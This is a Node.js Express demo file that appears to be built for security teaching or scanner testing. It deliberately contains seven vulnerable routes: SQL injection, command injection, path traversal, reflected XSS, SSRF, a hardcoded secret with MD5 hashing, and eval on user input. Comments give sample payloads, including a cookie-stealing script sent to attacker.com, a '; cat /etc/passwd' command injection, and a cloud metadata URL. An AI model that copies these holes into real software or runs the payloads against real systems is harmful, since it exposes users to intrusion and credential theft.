/**
 * Vulnerable Examples Demo File
 * 
 * This file contains typical security vulnerabilities found in Node.js applications,
 * such as SQL Injection, Command Injection, Path Traversal, SSRF, XSS, and weak cryptography.
 */

const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const mysql = require('mysql2'); // Mock library usage
const axios = require('axios');

const app = express();
app.use(express.json());

// ==========================================
// 1. SQL INJECTION (SQLi)
// ==========================================
// ❌ VULNERABLE: Direct string concatenation of user input in a SQL query.
app.get('/api/users', (req, res) => {
    const userId = req.query.id;
    const connection = mysql.createConnection({ host: 'localhost', user: 'root', database: 'test' });
    
    // Attack payload: 1 OR 1=1
    const query = `SELECT * FROM users WHERE id = ${userId}`;
    connection.query(query, (err, results) => {
        if (err) return res.status(500).send(err.message);
        res.json(results);
    });
});


// ==========================================
// 2. REMOTE OS COMMAND INJECTION
// ==========================================
// ❌ VULNERABLE: Direct execution of user input in a shell command.
app.get('/api/ping', (req, res) => {
    const host = req.query.host;
    
    // Attack payload: google.com; cat /etc/passwd
    exec(`ping -c 1 ${host}`, (err, stdout, stderr) => {
        if (err) return res.status(500).send(stderr);
        res.send(stdout);
    });
});


// ==========================================
// 3. PATH TRAVERSAL (Arbitrary File Read)
// ==========================================
// ❌ VULNERABLE: Joining unvalidated user input directly to file system operations.
app.get('/api/view', (req, res) => {
    const filename = req.query.file;
    const baseDir = '/var/www/uploads';
    
    // Attack payload: ../../../etc/passwd
    const filePath = path.join(baseDir, filename);
    
    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) return res.status(404).send('File not found');
        res.send(data);
    });
});


// ==========================================
// 4. CROSS-SITE SCRIPTING (Reflected XSS)
// ==========================================
// ❌ VULNERABLE: Rendering user-provided input directly into the HTML response without escaping.
app.get('/welcome', (req, res) => {
    const name = req.query.name;
    
    // Attack payload: <script>fetch('http://attacker.com?cookie='+document.cookie)</script>
    res.send(`<h1>Welcome, ${name}!</h1>`);
});


// ==========================================
// 5. SERVER-SIDE REQUEST FORGERY (SSRF)
// ==========================================
// ❌ VULNERABLE: Making HTTP requests to user-controlled URLs without restriction.
app.get('/api/fetch-metadata', async (req, res) => {
    const targetUrl = req.query.url;
    
    // Attack payload: http://169.254.169.254/latest/meta-data/
    try {
        const response = await axios.get(targetUrl);
        res.send(response.data);
    } catch (err) {
        res.status(500).send(err.message);
    }
});


// ==========================================
// 6. WEAK CRYPTOGRAPHY & HARDCODED SECRETS
// ==========================================
// ❌ VULNERABLE: Hardcoded secrets and using insecure MD5 hashing for passwords.
const JWT_SECRET_KEY = "SUPER_SECRET_KEY_12345"; // Hardcoded secret

function hashPasswordVulnerable(password) {
    // MD5 is cryptographically broken and prone to collision attacks.
    return crypto.createHash('md5').update(password).digest('hex');
}


// ==========================================
// 7. INSECURE DESERIALIZATION / ARBITRARY CODE EXECUTION
// ==========================================
// ❌ VULNERABLE: Using unsafe functions like eval() on user input.
app.post('/api/calculate', (req, res) => {
    const formula = req.body.formula;
    
    // Attack payload: process.exit(1) or require('child_process').exec(...)
    try {
        const result = eval(formula);
        res.json({ result });
    } catch (err) {
        res.status(400).send(err.message);
    }
});

app.listen(3000, () => {
    console.log('Vulnerable server running on port 3000');
});
